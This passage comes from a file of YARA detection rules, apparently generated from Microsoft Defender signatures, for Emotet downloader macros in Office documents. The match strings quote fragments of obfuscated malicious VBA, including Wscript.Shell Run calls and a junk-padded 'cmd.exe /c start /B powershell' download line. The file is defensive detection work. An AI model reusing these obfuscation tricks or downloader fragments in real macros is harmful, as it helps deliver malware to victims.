        $x_1_2 = {4e 65 78 74 20 [0-37] 3a [0-37] 20 3d 20 22 [0-32] 3a 77 [0-32] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {4e 65 78 74 20 [0-37] 3a [0-37] 20 3d 20 22 77 [0-32] 69 6e [0-32] 6d [0-32] 67 6d [0-32] 74 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 72 65 61 74 65 20 [0-32] 28}  //weight: 1, accuracy: Low
        $x_1_5 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_6 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 [0-32] 20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-32] 22 2c 20 [0-32] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_7 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-21] 47 6f 54 6f 20 [0-32] 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAS_2147772920_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAS!MTB"
        threat_id = "2147772920"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"sg yw ahrosg yw ahsg yw ahcesg yw ahssg yw ahssg yw ahsg yw ah\"" ascii //weight: 1
        $x_1_2 = " = \"sg yw ah:wsg yw ahsg yw ahinsg yw ah3sg yw ah2sg yw ah_sg yw ah\"" ascii //weight: 1
        $x_1_3 = " = \"wsg yw ahinsg yw ahmsg yw ahgmsg yw ahtsg yw ahsg yw ah\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 73 67 20 79 77 20 61 68 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAT_2147772933_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAT!MTB"
        threat_id = "2147772933"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4e 65 78 74 20 [0-37] 3a [0-32] 20 3d 20 22 [0-37] 22 [0-37] 20 3d 20 22 [0-32] 72 6f [0-32] 63 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 65 78 74 20 [0-37] 3a [0-32] 20 3d 20 22 [0-32] 3a 77 [0-32] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {4e 65 78 74 20 [0-37] 3a [0-37] 20 3d 20 22 77 [0-32] 69 6e [0-32] 6d [0-32] 67 6d [0-32] 74 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-32] 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-16] 47 6f 54 6f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAV_2147772999_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAV!MTB"
        threat_id = "2147772999"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"[ an ] +ro[ an ] +[ an ] +ce[ an ] +s[ an ] +s[ an ] +[ an ] +\"" ascii //weight: 1
        $x_1_2 = " = \"[ an ] +:w[ an ] +[ an ] +in[ an ] +3[ an ] +2[ an ] +_[ an ] +\"" ascii //weight: 1
        $x_1_3 = " = \"w[ an ] +in[ an ] +m[ an ] +gm[ an ] +t[ an ] +[ an ] +\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 5b 20 61 6e 20 5d 20 2b 22 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAW_2147773052_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAW!MTB"
        threat_id = "2147773052"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"x [ sh brox [ sh bx [ sh bcex [ sh bsx [ sh bsx [ sh bx [ sh b\"" ascii //weight: 1
        $x_1_2 = " = \"x [ sh b:wx [ sh bx [ sh binx [ sh b3x [ sh b2x [ sh b_x [ sh b\"" ascii //weight: 1
        $x_1_3 = " = \"wx [ sh binx [ sh bmx [ sh bgmx [ sh btx [ sh bx [ sh b\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 78 20 5b 20 73 68 20 62 22 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAX_2147773068_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAX!MTB"
        threat_id = "2147773068"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 [0-37] 22 [0-37] 20 3d 20 22 [0-32] 72 6f [0-32] 63 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 [0-32] 3a 77 [0-32] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 77 [0-32] 69 6e [0-32] 6d [0-32] 67 6d [0-32] 74 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 [0-37] 22 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAY_2147773135_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAY!MTB"
        threat_id = "2147773135"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4c 6f 6f 70 [0-32] 4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 [0-37] 22 [0-37] 20 3d 20 22 [0-32] 72 6f [0-32] 63 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 6f 6f 70 [0-32] 4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 [0-32] 3a 77 [0-32] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 6f 6f 70 [0-32] 4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 77 [0-32] 69 6e [0-32] 6d [0-32] 67 6d [0-32] 74 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 [0-37] 22 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAZ_2147773136_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAZ!MTB"
        threat_id = "2147773136"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 64 20 49 66 [0-56] 20 3d 20 [0-56] 4c 6f 6f 70 [0-32] 4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 [0-37] 22 [0-37] 20 3d 20 22 [0-32] 72 6f [0-32] 63 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 49 66 [0-56] 20 3d 20 [0-56] 4c 6f 6f 70 [0-32] 4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 [0-32] 3a 77 [0-32] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 64 20 49 66 [0-56] 20 3d 20 [0-56] 4c 6f 6f 70 [0-32] 4e 65 78 74 [0-37] 3a [0-37] 20 3d 20 22 77 [0-32] 69 6e [0-32] 6d [0-32] 67 6d [0-32] 74 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 [0-37] 22 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TAC_2147773183_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TAC!MTB"
        threat_id = "2147773183"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"ns wu db ndrons wu db ndns wu db ndc\" + \"ens wu db ndsns wu db ndsns wu db ndns wu db nd\"" ascii //weight: 1
        $x_1_2 = " = \"ns wu db nd:wns wu db ndns w\" + \"u db ndinns wu db nd3ns wu db nd2ns wu db nd_ns wu db nd\"" ascii //weight: 1
        $x_1_3 = " = \"wns wu db ndi\" + \"nns wu db ndmns wu db ndgmns wu db ndtns wu db ndns wu db nd\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 6e 73 20 77 22 20 2b 20 22 75 20 64 62 20 6e 64 22 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TAD_2147773190_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TAD!MTB"
        threat_id = "2147773190"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 64 20 49 66 [0-32] 44 69 6d 20 [0-32] 28 29 20 41 73 20 [0-32] 3a 20 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 2c 20 [0-32] 29 [0-32] 3a [0-32] 20 3d 20 22 [0-64] 22 [0-48] 20 3d 20 22 [0-32] 72 6f [0-48] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 49 66 [0-32] 44 69 6d 20 [0-32] 28 29 20 41 73 20 [0-32] 3a 20 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 2c 20 [0-32] 29 [0-32] 3a [0-48] 20 3d 20 22 [0-37] 3a 77 [0-48] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 64 20 49 66 [0-32] 44 69 6d 20 [0-32] 28 29 20 41 73 20 [0-32] 3a 20 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 2c 20 [0-32] 29 [0-32] 3a [0-64] 20 3d 20 22 77 [0-32] 69 [0-37] 6d [0-32] 67 6d [0-32] 74 [0-48] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 72 65 61 74 65 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TAF_2147773191_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TAF!MTB"
        threat_id = "2147773191"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 6f 6e 73 74 20 [0-32] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 2a 68 69 67 68 2a 2c 2a 63 72 69 74 69 63 2a 22}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 [0-32] 20 41 73 20 52 61 6e 67 65 3a 20 53 65 74 20 [0-32] 20 3d 20 41 72 72 61 79 28 28 [0-32] 29 2c 20 54 61 72 67 65 74 29 [0-32] 49 66 20 [0-32] 20 49 73 20 4e 6f 74 68 69 6e 67 20 54 68 65 6e [0-32] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-32] 47 6f 54 6f 20 [0-32] 43 6f 6e 73 74}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 [0-32] 2c 20 [0-32] 29 [0-32] 3a [0-32] 20 3d 20 [0-32] 20 2b 20 [0-48] 2e 20 5f 02 00 43 6f 6e 74 65 6e 74 20 2b 20 [0-48] 47 6f 54 6f 20 [0-32] 43 6f 6e 73 74}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RPE_2147798901_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPE!MTB"
        threat_id = "2147798901"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".CreateObject(\"Wsc\" & \"ript.Sh\" + s1 + \"ell\", \"\").Run" ascii //weight: 1
        $x_1_2 = "service.CreateObject(\"Wscript.Shell\", \"\").Run" ascii //weight: 1
        $x_5_3 = "CewcCewmCewd.CeweCewxCewe /Cewc sCewtCewaCewrt Cew/CewBCew CewpCewoCewwCewerCewsheCewlCewl" ascii //weight: 5
        $x_5_4 = " = Replace(s2, \"Cew\", \"\")" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_RPE_2147798901_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPE!MTB"
        threat_id = "2147798901"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 73 20 44 6f 75 62 6c 65 0d 0a 20 20 20 [0-5] 20 3d 20 22 [0-16] 63 [0-16] 6d 64 2e [0-16] 65 [0-16] 78 65 20 [0-16] 2f [0-16] 63 20 73 [0-16] 74 61 [0-16] 72 74 20 2f [0-16] 42 20 70 6f [0-16] 77 [0-16] 65 72 [0-16] 73 68 [0-16] 65 6c [0-16] 6c 20 24 64 [0-16] 66 6b 6a 3d 22 22 24 [0-16] 73 74 [0-16] 72 73 3d 5c 22 22 68 [0-16] 74 [0-16] 74 70 3a [0-16] 2f [0-16] 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {73 65 72 76 69 63 65 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 63 22 20 2b 20 [0-5] 20 2b 20 22 72 69 70 74 2e 53 68 65 22 20 26 20 22 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-5] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RPE_2147798901_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPE!MTB"
        threat_id = "2147798901"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 57 69 6e 64 6f 77 73 5c [0-5] 53 79 73 74 65 6d 33 32 5c [0-5] 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {5c 57 69 6e 64 6f 77 73 5c [0-5] 53 79 73 74 65 6d 33 32 5c [0-5] 74 22 26 22 74 70 22 26 22 73 3a}  //weight: 1, accuracy: Low
        $x_1_3 = {5c 57 69 6e 64 6f 77 73 5c [0-7] 53 79 73 74 65 6d 33 32 5c [0-7] 74 22 26 22 74 70 22 26 22 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_4 = {5c 57 69 6e 64 6f 77 73 5c [0-7] 53 79 73 74 65 6d 33 32 5c [0-7] 74 22 26 22 74 22 26 22 70 3a}  //weight: 1, accuracy: Low
        $x_1_5 = {5c 57 69 6e 64 6f 77 73 5c [0-7] 53 79 73 74 65 6d 33 32 5c 68 [0-7] 74 22 26 22 70 22 26 22 73 3a}  //weight: 1, accuracy: Low
        $x_1_6 = {5c 57 69 6e 64 6f 77 73 5c [0-7] 53 79 73 74 65 6d 33 32 5c 68 [0-7] 74 22 26 22 70 3a}  //weight: 1, accuracy: Low
        $x_1_7 = {5c 57 69 6e 64 6f 77 73 5c [0-7] 53 79 73 74 65 6d 33 32 5c [0-7] 74 74 22 26 22 70 3a}  //weight: 1, accuracy: Low
        $x_1_8 = {5c 57 69 6e 64 6f 77 73 5c [0-7] 53 79 73 74 65 6d 33 32 5c [0-7] 74 74 22 26 22 70 22 26 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_NEMA_2147798988_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.NEMA!MTB"
        threat_id = "2147798988"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set TS = fso.OpenTextFile(FileName$, 1, True): txt$ = TS.ReadAll: TS.Close" ascii //weight: 1
        $x_1_2 = "Sub cbklu3eiorauwbtoibnof3ibtaoiwbtoaiwhngpofkjhpzjus4oighszoizcdvibh(ByVal hskld As String, ByVal uowien As String)" ascii //weight: 1
        $x_1_3 = "dgfjalfhkaugwikgfuol3wgnacoi3u5taboi3ut5roai3u5go3wugaolisdrgfso8i7wejwdoljgf \"sd\", 0, 0" ascii //weight: 1
        $x_1_4 = "MsgBox fjl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_NEMB_2147798989_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.NEMB!MTB"
        threat_id = "2147798989"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function fqwleklkj(Optional ByVal Title As String = \" \", _" ascii //weight: 1
        $x_1_2 = "Dim ghkafjek As Double" ascii //weight: 1
        $x_1_3 = "Private Sub gfliewhel()" ascii //weight: 1
        $x_1_4 = "service.CreateObject(\"Wscript.Shell\", \"\").Run ra, 0" ascii //weight: 1
        $x_1_5 = "MsgBox fjl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_NEMC_2147799042_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.NEMC!MTB"
        threat_id = "2147799042"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "s2 = \"DaIcDaImd.DaIeDaIxe DaI/DaIc sDaItaDaIrt /DaIB poDaIwDaIerDaIshDaIelDaIl $dDaIfkj=\"\"$DaIstDaIrs=\\\"\"hDaIttDaIpDaIs:" ascii //weight: 1
        $x_1_2 = ".SDaIplDaIit(\\\"\"DaI,DaI\\\"\");fDaIoDaIreacDaIh($DaIst iDaIn \"" ascii //weight: 1
        $x_1_3 = {72 61 20 3d 20 52 65 70 6c 61 63 65 28 73 32 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {51 75 65 72 79 54 61 62 6c 65 73 2e 41 64 64 28 22 22 20 26 20 52 65 70 6c 61 63 65 28 66 69 6c 65 6e 61 6d 65 24 2c 20 22 20 22 2c 20 22 [0-16] 22 29 2c 20 74 6d 70 53 68 65 65 74 2e 52 61 6e 67 65 28 22 41 31 22 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_NEMD_2147799043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.NEMD!MTB"
        threat_id = "2147799043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Function FileQueryRange(ByVal filename$, Optional ByVal Tables$) As Range" ascii //weight: 1
        $x_1_2 = "Dim tmpSheet As Worksheet: Set tmpSheet = ThisWorkbook.Worksheets(\")" ascii //weight: 1
        $x_1_3 = {72 61 20 3d 20 52 65 70 6c 61 63 65 28 73 32 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "txt$ = FileToVBAFunction(\",\", \",\")" ascii //weight: 1
        $x_1_5 = "= CreateObject(\"Wsc\" + s1 + \"ript.She\" & \"ll\")" ascii //weight: 1
        $x_1_6 = "For i = 1 To Len(txt$)" ascii //weight: 1
        $x_1_7 = "filename = Application.GetOpenFilename(\",\", , \",\", \".\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVA_2147799074_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVA!MTB"
        threat_id = "2147799074"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
